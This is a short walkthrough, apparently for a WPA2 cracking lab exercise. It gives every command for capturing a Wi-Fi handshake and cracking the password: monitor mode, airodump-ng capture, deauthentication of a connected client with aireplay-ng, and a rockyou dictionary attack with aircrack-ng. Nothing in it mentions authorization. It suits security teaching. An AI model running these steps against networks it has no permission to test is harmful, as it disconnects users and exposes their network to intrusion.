# WPA2 Cracking Exercise - Walkthrough

#### Installing `aircrack-ng`, `iwconfig`, and `airmon-ng`
1. **Open a terminal and update your package list**:
   ```bash
   sudo apt update
   ```

2. **Install `aircrack-ng` (this will install `airmon-ng` and other dependencies)**:
   ```bash
   sudo apt install aircrack-ng
   ```

### 2. **Put Your WiFi Adapter into Monitor Mode**
Monitor mode allows us to capture WiFi traffic, including handshakes.
1. **Stop NetworkManager** (optional but recommended):
   ```bash
   sudo ip link set wlp2s0 down
   sudo iw dev wlp2s0 set type monitor
   sudo ip link set wlp2s0 up
   iwconfig 
   ```

### 3. **Capture WPA2 Handshake**
1. **Use `airodump-ng` to capture packets**:
   ```bash
   sudo airodump-ng wlp2s0
   ```

2. **Identify client MACs connected to AP**:
   * Start `airodump-ng` with the correct BSSID (the MAC address of the access point's wireless interface) and channel, saving the capture file to a directory:
     ```bash
     sudo airodump-ng --bssid <Target BSSID> -c <Channel Number> wlp2s0
     ```

2. **Deauthenticate the client**:
   * You can force a client to reconnect to capture the handshake:
     ```bash
     sudo aireplay-ng --deauth 10 -a <Target BSSID> -c <Client MAC> wlp2s0
     ```

3. **Capture the handshake**:
   * Start `airodump-ng` with the correct BSSID (the MAC address of the access point's wireless interface) and channel, saving the capture file to a directory:
     ```bash
     sudo airodump-ng --bssid <Target BSSID> -c <Channel Number> -w /path/to/save/handshake wlp2s0
     ```

### 4. **Crack the WPA2 Password Using `aircrack-ng`**
1. **Download the `rockyou.txt` wordlist**:
   * Navigate to the desired folder (e.g., `~/Downloads`) and download the wordlist:
     ```bash
     wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
     ```
   * Extract the wordlist:
     ```bash
     tar -xvf rockyou.txt.tar.gz
     ```

2. **Run `aircrack-ng` on the captured `.cap` file**:
   ```bash
   sudo aircrack-ng -e "Your Network Name" -w /path/to/rockyou.txt /path/to/your/capture.cap
   ```

